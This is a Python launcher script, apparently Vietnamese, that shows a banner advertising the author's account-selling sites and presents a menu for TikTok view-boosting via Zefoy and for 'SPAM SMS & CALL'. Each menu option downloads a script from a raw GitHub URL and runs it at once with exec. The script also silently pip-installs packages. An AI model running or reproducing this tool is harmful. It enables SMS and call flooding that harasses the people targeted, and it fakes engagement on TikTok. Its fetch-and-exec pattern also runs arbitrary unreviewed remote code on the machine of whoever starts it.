import threading,base64
import os,time,re,json,random
from datetime import datetime
from time import sleep,strftime
import requests
import os, sys
try:
  from faker import Faker
  from requests import session
  from colorama import Fore, Style
  import requests, random, re
  from random import randint
  import requests,pystyle
except:
  os.system("pip install faker")
  os.system("pip install requests")
  os.system("pip install colorama")
  os.system('pip install requests && pip install bs4 && pip install pystyle')
  os.system("pip install pytz")
  print('__Vui Lòng Chạy Lại Tool__')
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
#MÀU
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;39m"
whiteb="\033[1;39m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
#ĐÁNH DẤU BẢN QUYỀN
dev="\033[1;39m[\033[1;31m×\033[1;39m]\033[1;39m"
def banner():
 banner = f"""\033[1;39m
              ███████╗ █████╗  ██████╗████████╗
              ██╔════╝██╔══██╗██╔════╝╚══██╔══╝
              █████╗  ███████║╚█████╗    ██║
              ██╔══╝  ██╔══██  ╚═══██╗   ██║
              ██║     ██║  ██║██████╔╝   ██║
              ╚═╝     ╚═╝  ╚═╝╚═════╝    ╚═╝
\033[1;39m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━

\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
\033[1;39m┌──────────────────────── ONEONE ────────────────────────┐
\033[1;36m║   \033[1;39mPYTHON VERSION\033[1;36m 1.0                                   \033[1;36m║
\033[1;36m║   \033[1;39mFACEBOOK           :  1100075948096672               \033[1;36m║
\033[1;36m║   \033[1;39mZALO               :  ZALO.ME/0345794645             \033[1;36m║
\033[1;36m║   \033[1;39mWWEBSITE           :  BuyLike.Top & BuyClone.Top     \033[1;36m║
\033[1;36m║   \033[1;39mTOOL WORLD         :  SPAM SMS & ZEFOY               \033[1;36m║
\033[1;39m└────────────────────────────────────────────────────────┘

\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
"""
 for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
  sleep(0.000001)
 
 
# =======================[RUN]=======================#
while True:
	os.system('clear')
	banner()
	print("\033[1;39m┌───────────────────┐         ")
	print("\033[1;36m║   \033[1;39m SELECT         \033[1;36m║          ")
	print("\033[1;39m└───────────────────┘          ")
	print("\033[1;31m[\033[1;39m1\033[1;31m] \033[1;32m TOOL BUFF VIEW TIKTOK ZEFOY ")
	print("\033[1;31m[\033[1;39m2\033[1;31m] \033[1;32m TOOL SPAM SMS & CALL ")

	
	chon = input('\033[1;39m[\033[1;31m⋉ ⋊ \033[1;39m] \033[1;39m➩ \033[1;39m[\033[1;32mCHOSE\033[1;39m]\033[1;39m: \033[1;32m')
	print('\033[1;39m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = ')
	if chon == '1' :
		exec(requests.get('https://raw.githubusercontent.com/betxinmain/tiktoklive/refs/heads/main/v2.py').text)
	if chon == '2' :
		exec(requests.get('https://raw.githubusercontent.com/betxinmain/tiktoklive/refs/heads/main/o.py').text)
		continue
